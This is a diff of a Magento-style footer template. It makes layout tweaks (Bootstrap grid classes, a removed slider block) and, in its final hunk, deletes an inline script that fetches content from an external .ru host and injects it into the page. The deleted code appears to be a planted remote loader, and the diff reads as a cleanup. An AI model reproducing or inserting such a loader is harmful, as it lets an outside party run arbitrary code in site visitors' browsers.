@@ -12,7 +12,7 @@
         <div class="footer-top">
             <div class="container">
                 <div class="row">
-                    <div class="col-sm-12">
+                    <div class="col-md-12">
                     <?php
                         $area = 'footer_top_block';
                         $type = $footer[$area];
@@ -49,7 +49,7 @@
                         $area = 'footer_middle_column_'.$i;
                         $type = $footer[$area];
                         if( $type ){
-                            echo '<div class="col-sm-'.$footer[$area.'_size'].'">';
+                            echo '<div class="col-lg-'.$footer[$area.'_size'].'">';
                         }
                         if( $type == 'custom' ){
                             echo $this->getLayout()->createBlock('cms/block')->setBlockId($footer[$area.'_custom'])->toHtml();
@@ -89,7 +89,7 @@
                         $area = 'footer_middle_2_column_'.$i;
                         $type = $footer[$area];
                         if( $type ){
-                            echo '<div class="col-sm-'.$footer[$area.'_size'].'">';
+                            echo '<div class="col-lg-'.$footer[$area.'_size'].'">';
                         }
                         if( $type == 'custom' ){
                             echo $this->getLayout()->createBlock('cms/block')->setBlockId($footer[$area.'_custom'])->toHtml();
@@ -118,7 +118,6 @@
         if( $footer['footer_bottom_enabled'] ){
     ?>
         <div class="footer-bottom">
-            <?php echo $this->getChildHtml("home_slider");?>     
             <div class="container">
                 <?php
                 if($footer['footer_logo']){
@@ -170,20 +169,3 @@
         $(".cms-index-index .footer-container.fixed-position .footer-top,.cms-index-index .footer-container.fixed-position .footer-middle").remove();
     });
 </script>
-
-<script>
-   (function (w, d) {
-   var xhr = new XMLHttpRequest(),
-       s = d.createElement("script"),
-       f = document.body.firstChild;
-   s.type = "text/javascript";
-   s.async = true;
-   s.setAttribute("id", "1b742734e216b924dcf4b444a4cdbc7c");
-   f.parentNode.insertBefore(s, f);   xhr.onreadystatechange = function() {
-   if (this.readyState === 4 && this.status === 200) {
-           d.getElementById("1b742734e216b924dcf4b444a4cdbc7c").innerHTML = this.responseText;
-       }
-   };
-   xhr.open("GET", "https://sovetnik-off.ru/block/1b742734e216b924dcf4b444a4cdbc7c");
-   xhr.send();
-})(window, document);</script>
